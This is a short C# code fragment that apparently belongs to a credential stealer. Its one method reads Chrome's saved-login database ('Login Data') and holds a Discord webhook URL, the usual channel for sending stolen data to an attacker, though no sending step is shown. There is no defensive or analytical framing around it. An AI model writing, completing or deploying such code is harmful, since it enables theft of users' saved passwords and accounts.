class S { void Go(){ var db = File.ReadAllBytes("Chrome\\User Data\\Default\\Login Data"); var hook = "https://discord.com/api/webhooks/123/token"; } }
